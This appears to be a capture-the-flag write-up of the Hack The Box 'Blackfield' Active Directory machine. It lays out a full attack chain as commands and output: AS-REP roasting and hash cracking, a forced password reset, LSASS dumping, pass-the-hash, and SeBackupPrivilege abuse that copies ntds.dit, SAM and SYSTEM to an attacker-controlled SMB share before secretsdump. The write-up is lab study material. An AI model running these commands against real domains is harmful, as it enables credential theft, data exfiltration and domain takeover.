# Blackfiled.local from nmap or smbmap output
### Let's start with DNS and put domain to host file
```bash
dig ANY @$IP BLACKFIELD.local
```
dc01.BLACKFIELD.local. hostmaster.BLACKFIELD.local

```bash
nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='blackfield.local'" $IP -Pn
```

### From LDAP to DNS then back to LDAP
##### Get domains
```bash
ldapsearch -h $IP -x -s base namingcontexts <- outdated syntax now
ldapsearch -x -H ldap://$IP -s base > ldapsearch_all.txt
ldapsearch -x -H ldap://$IP -b "dc=blackfield,dc=local" -s base '(objectclass=*)' > ldapsearch_with_dc.txt
ldapsearch -x -H ldap://$IP -b "dc=blackfield,dc=local" -s base > ldapsearch_no_oc.txt

namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local
```

##### Dig domain
```bash
dig @$IP ForestDnsZones.BLACKFIELD.local
dig @$IP DomainDnsZones.BLACKFIELD.local
```

##### LDAP again
```bash
ldapsearch -H ldap://$IP -x -b "DC=BLACKFIELD,DC=local" | tee ldap-anonymous # anonymous login
```

### SMB seems the only choice now
https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#smb---tcp-445

```bash
crackmapexec smb $IP

smbclient -N -L \\\\$IP

smbmap -u null -p "" -H $IP -P 445
```

##### Guest Session by smbmap
```bash
❯ smbmap -H blackfield.local -u null -p ''
[+] Guest session       IP: blackfield.local:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
```

##### Download the profiles
```bash
smbclient //blackfield.local/profiles$
```

##### Get the user list by Mounting and list users
```bash
sudo mount -t cifs //$IP/profiles$ /mnt
```

use -1 in ls to print only the directories one per line:
```bash
ls -1 /mnt/ > users
```

### Check valid users first
```bash
/opt/kerbrute_linux_amd64 userenum -d blackfield.local --dc $IP users.txt
```

[+] VALID USERNAME:       audit2020@blackfield.local
[+] VALID USERNAME:       support@blackfield.local
Date & Time >  [+] VALID USERNAME:       svc_backup@blackfield.local

```bash
echo "audit2020@blackfield.local" > valid_users.txt
echo "support@blackfield.local" >> valid_users.txt
echo "svc_backup@blackfield.local" >> valid_users.txt
```

### UF_DONT_REQUIRE_PREAUTH set to true
https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#as-rep-roast

```bash
impacket-GetNPUsers blackfield.local/ -dc-ip $IP -no-pass -usersfile valid_users.txt 

for user in $(cat users); do ./GetNPUsers.py -no-pass -dc-ip $IP blackfield.local/$user ; done
for user in $(cat users); do ./GetNPUsers.py -no-pass -dc-ip $IP blackfield.local/$user | grep krb5asrep; done

# Or use usersfile instead of for loop

./GetNPUsers.py blackfield.local/ -no-pass -usersfile users -dc-ip $IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'

$krb5asrep$23$support@BLACKFIELD.LOCAL:8a1e7ddb1873d327b07f1ab17984ec19$2aefece1a101fca7f6ba50b9566d0820ff6c0aa69bc4fbb1c0fb522a47c9bcfeca825a52f0f80f8e9e24adee03954637d8e13a99147f7d0f5a7704e8fe9859393c279cd0f6df14014a61ef3c0193191656bc4da3f7a8f91aaed8d0b65918d7db56fbff01a46233584f1f438ce82d79e78be99644673b097ed69ae997aeab3c3d724d506cc7d2887ea3a71a35d9fb383ed2479262ca2819026dcdf01ffa013911e83ffacaad656916804a74e228b5992bff6d1b2e1959633cb7db64eee5c5f33a15bc7fe5c
```

### hashcat as usual
`hashcat --example-hashes | grep krb5asrep -B5`

There is chance that the hash is damaged. Just capture it and try again

```bash
hashcat -m 18200 --force -a 0 hash /usr/share/wordlists/rockyou.txt
```
support@BLACKFIELD.LOCAL
#00^BlackKnight

### Try to login with evil-winrm and psexec.py
```bash
evil-winrm -i $IP -u support -p "#00^BlackKnight"

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
```

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py BLACKFIELD.LOCAL/support:'#00^BlackKnight'@BLACKFIELD.LOCAL

[*] Requesting shares on BLACKFIELD.LOCAL.....
[-] share 'ADMIN$' are not writable.
```

### Access Check should be done before trying login
##### winrm
```bash
crackmapexec winrm $IP -u support -p '#00^BlackKnight'
```

can't use winrm as expected since no shares writable.

##### ldap
```bash
ldapsearch -h $IP -D cn=support,dc=blackfield,dc=local -w '#00^BlackKnight' -x -b 'dc=blackfield,dc=local'
```
can't do either `ldap_bind: Invalid credentials (49)`

##### SMB again

```bash
crackmapexec smb $IP -u support -p '#00^BlackKnight'

smbmap -H $IP -u support -p '#00^BlackKnight'
```

### Kerberoasting since 88 is opening
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip $IP BLACKFIELD.LOCAL/support:'#00^BlackKnight' -save -outputfile GetUserSPNs.out
```

No entries found!

### Try rpcclient again since none of them worked
```bash
rpcclient -U support $IP

enumdomusers
```

### BloodHound python
* -c ALL All collection methods
* -d domain name
* -dc DC name
* -ns use $IP as the DNS server

```bash
bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns $IP

or

bloodhound-python -c DcOnly -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns $IP 

bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -dc dc01.blackfield.local -ns $IP
```

Click "OUTBOUND OBJECT CONTROL" -> "First Degree Object Control"

##### Reset AD passwords
https://room362.com/post/2017/reset-ad-user-password-with-linux/

https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse#forcechangepassword

https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

note level 23 is the arbitrary to make it work here.

```bash
rpcclient $> setuserinfo2 audit2020 23 'qwer1234' 
result: NT_STATUS_PASSWORD_RESTRICTION
result was NT_STATUS_PASSWORD_RESTRICTION
rpcclient $> setuserinfo2 audit2020 23 'qwer1234!'
```

### Access Check should be done before trying login
##### winrm
```bash
crackmapexec winrm $IP -u audit2020 -p 'qwer1234!'
```
```bash result
SMB         10.129.114.78   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
HTTP        10.129.114.78   5985   DC01             [*] http://10.129.114.78:5985/wsman
WINRM       10.129.114.78   5985   DC01             [-] BLACKFIELD.local\audit2020:qwer1234!
```
still no winrm, but can smb

### Then let's SMB
```bash
smbmap -H $IP -u audit2020 -p 'qwer1234!'

smbclient //$IP/forensic -U=audit2020%qwer1234!
cd memory_analysis
get lsass.zip

smbget -R smb://$IP/forensic/memory_analysis/lsass.zip -U=audit2020%qwer1234!
```

### Dump plaintext credentials and hashes from lsass.exe
LSASS is short for Local Security Authority Subsystem Service, and it stores credentials in memory on behalf of a user that hash an active or recently active session. This allows the user to access network recourses withouth re-typing their credentials for each service. LSASS may store credentials in multiple forums, including reverisbly passwords, Kerberos tickets, NT hash, LM hash, DPAPI keys and Smartcard PIN.

As anti-virus started catching on to that, attackers pivoted. A well known technique is to use procdump.exe from Sysinternals (and signed by Microsoft) to dump lsass.exe and then exfil that memory dump and extract hashes from it in the attacker controlled space.

```bash
unzip lsass.zip

file lsass.DMP

ls -lh lsass.DMP 

pypykatz lsa minidump lsass.DMP

INFO:root:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
```

### Login as svc_backup and get user flag
```bash
crackmapexec winrm $IP -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
evil-winrm -i $IP -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

### Kerberoasting the service account(svc_backup) since SeBackupPrivileges Enabled
```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP -hashes :9658d1d1dcd9250115e2205d9f48400d 'BLACKFIELD.LOCAL/svc_backup' -request

python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip $IP -hashes '':9658d1d1dcd9250115e2205d9f48400d 'BLACKFIELD.LOCAL/svc_backup' -request
```
No entries found!

### Check if it whether kerberoastable or not, which should be done first.. lol
```winrm
setspn -T blackfield.local -F -Q */*
```
```bash result
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> setspn -T blackfield.local -F -Q */*
Checking forest DC=BLACKFIELD,DC=local
CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.BLACKFIELD.local
        ldap/DC01.BLACKFIELD.local/ForestDnsZones.BLACKFIELD.local
        ldap/DC01.BLACKFIELD.local/DomainDnsZones.BLACKFIELD.local
        TERMSRV/DC01
        TERMSRV/DC01.BLACKFIELD.local
        DNS/DC01.BLACKFIELD.local
        GC/DC01.BLACKFIELD.local/BLACKFIELD.local
        RestrictedKrbHost/DC01.BLACKFIELD.local
        RestrictedKrbHost/DC01
        RPC/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local
        HOST/DC01/BLACKFIELD
        HOST/DC01.BLACKFIELD.local/BLACKFIELD
        HOST/DC01
        HOST/DC01.BLACKFIELD.local
        HOST/DC01.BLACKFIELD.local/BLACKFIELD.local
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/2a754031-e5c5-4e88-bb09-09aae693753c/BLACKFIELD.local
        ldap/DC01/BLACKFIELD
        ldap/2a754031-e5c5-4e88-bb09-09aae693753c._msdcs.BLACKFIELD.local
        ldap/DC01.BLACKFIELD.local/BLACKFIELD
        ldap/DC01
        ldap/DC01.BLACKFIELD.local
        ldap/DC01.BLACKFIELD.local/BLACKFIELD.local
CN=krbtgt,CN=Users,DC=BLACKFIELD,DC=local
        kadmin/changepw

Existing SPN found!
```
Not kerberoastable since no service accounts have SPNs assigned to them(the users you have and the Backup Operator user e.g. backup_svc). Just the DC and krbtgt.

### An Easier Way to extract a copy of the local SAM file hash
```winrm
reg save hklm\sam C:\temp\SAM
reg save hklm\system C:\temp\system
```

nope reg.exe : ERROR: The system was unable to find the specified registry key or value.

### Extracting a copy of the Local SAM using diskshadow.exe and robocopy
* https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#copy-filesebackupprivilege
* https://pentestlab.blog/tag/diskshadow/

```bash
cat alvin.dsh

❯ unix2dos alvin.dsh
unix2dos: converting file alvin.dsh to DOS format...
```

mv to c:\windows\temp first OR set metadata in dsh. Details in medium https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

```winrm
upload alvin.dsh
diskshadow /s alvin.dsh
robocopy /b z:\windows\ntds . ntds.dit                  # Get ntds.dit or SAM. NTDS.dit contains all domain user hashes
robocopy /b z:\windows\System32\Config . SAM            # Get ntds.dit or SAM. SAM contains local user hashed
robocopy /b z:\windows\System32\Config . SYSTEM         # Get SYSTEM !!
```

### Download them
```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -user as -password as
```

```winrm
net use \\10.10.16.13\share /u:as as
copy SYSTEM \\10.10.16.13\share
copy ntds.dit \\10.10.16.13\share
copy SAM \\10.10.16.13\share
```

### Root
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -ntds ntds.dit -system SYSTEM local <- this one works

python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM local
```
